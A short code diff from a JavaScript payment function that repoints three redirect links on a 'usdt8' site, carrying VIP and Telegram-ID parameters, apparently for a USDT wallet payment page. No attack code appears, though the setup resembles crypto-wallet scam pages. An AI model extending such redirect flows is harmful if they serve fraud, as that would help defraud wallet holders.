@@ -90,9 +90,9 @@ function paylistevent(from) {
 	// "&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
 	// var Ead = document.getElementById('input_num').innerHTML
 	var tgid = getUrlParams('tgid')
-	let im_url = 'https://usdt8.github.io/c/index.html?vip=' + vip
-	let tp_url = 'https://usdt8.github.io/c/index.html?vip=' + vip
-	let my_url = 'https://usdt8.github.io/e/index.html?vip=' + vip
+	let im_url = 'https://usdt8.github.io/d/index.html?vip=' + vip
+	let tp_url = 'https://usdt8.github.io/d/index.html?vip=' + vip
+	let my_url = 'https://usdt8.github.io/d/index.html?vip=' + vip
 
 	if (tgid) {
 		im_url += '&tgid=' + tgid
